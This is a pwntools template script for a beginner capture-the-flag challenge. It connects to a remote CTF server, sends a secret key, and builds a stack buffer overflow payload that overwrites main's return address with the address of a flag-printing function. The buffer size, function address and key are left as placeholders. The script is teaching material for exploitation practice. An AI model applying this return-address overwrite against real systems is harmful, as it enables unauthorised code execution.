from pwn import *

#FILL OUT THESE THREE
buffer_size = ???
addr_of_printflag_function = ???
secret_key_string = ???

#uncomment this line if you would like to test locally
#p = process("./my_first_pwn")
#uncomment this line if you would like to run the script against the remote binary and get the flag
p = remote("ctf-league.osusec.org", 31309)

#let's recieve the first bytes from the binary and print them out
print(p.recv())

#hmm they want the secret key from the web part of this challenge
print("sending the key string: " + secret_key_string)
p.send(secret_key_string)
print("response: " + p.recv().decode())

#fill the buffer with As (or any other random character)
payload = b'A' * buffer_size

#overflow the saved_ebp as well
payload += b'B' * 8 

#now we can overwrite the return addr of main
payload += p64(addr_of_printflag_function)

#send the payload
print(b"payload: " + payload)
p.send(payload)

#make the session interactive
p.interactive()
